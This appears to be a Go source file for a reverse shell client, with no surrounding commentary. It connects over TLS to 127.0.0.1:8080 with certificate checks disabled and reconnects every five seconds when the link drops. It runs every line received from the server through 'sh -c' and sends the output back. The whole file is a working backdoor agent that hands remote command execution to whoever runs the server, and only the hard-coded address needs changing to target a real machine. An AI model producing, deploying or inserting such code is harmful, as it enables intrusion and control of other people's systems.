package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"os/exec"
	"strings"
	"time"
)

func main() {
	for {
		// Configure TLS client (skip certificate verification)
		config := &tls.Config{InsecureSkipVerify: true}
		conn, err := tls.Dial("tcp", "127.0.0.1:8080", config)
		if err != nil {
			fmt.Println("Error connecting to server:", err)
			time.Sleep(5 * time.Second) // Retry connection after 5 seconds
			continue
		}
		fmt.Println("Connected to server via secure connection")

		handleConnection(conn)
	}
}

func handleConnection(conn *tls.Conn) {
	defer conn.Close()
	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Connection to server lost:", err)
			return
		}
		command = strings.TrimSpace(command)

		if command == "exit" || command == "quit" {
			fmt.Println("Server closed the connection")
			return
		}

		fmt.Println("Executing command:", command)
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\nExecution error: "+err.Error())...)
		}

		// Send output size
		var length int32 = int32(len(output))
		if err := binary.Write(conn, binary.LittleEndian, length); err != nil {
			fmt.Println("Error sending response size:", err)
			return
		}

		// Send the actual output
		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Error sending response:", err)
			return
		}
	}
}
